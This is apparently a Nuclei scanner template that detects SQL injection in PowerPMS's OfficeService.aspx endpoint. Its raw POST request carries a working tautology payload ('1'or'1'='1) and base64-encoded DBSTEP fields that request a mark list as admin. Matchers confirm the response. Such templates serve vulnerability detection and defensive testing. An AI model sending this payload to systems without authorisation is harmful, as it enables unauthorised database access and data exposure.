id: powerpms-officeservice-sqli
info:
  name: PowerPMS OfficeService.aspx SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  random: '{{rand_int(100000,999999)}}'

http:
  - raw:
      - |
        POST /PowerPlat/FormXml/DocFile/OfficeService.aspx?HumanId=1'or+'1'='1 HTTP/1.1
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        DBSTEP V3.0     135             0               8               DBSTEP=REJTVEVQ
        OPTION=TE9BRE1BUktMSVNU
        USERNAME=YWRtaW4=
        TEMPLATE=dGVzdC50eHQ=
        FILENAME=dGVzdC50eHQ=
        RECORDID=dHh0
        FILETYPE=dHh0
        {{random}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "DBSTEP V3.0"
      - type: word
        words:
          - "{{random}}"
      - type: regex
        regex:
          - "MARKLIST=[A-Za-z0-9+/]{20,}={0,2}"
      - type: word
        words:
          - "<"
        negative: true
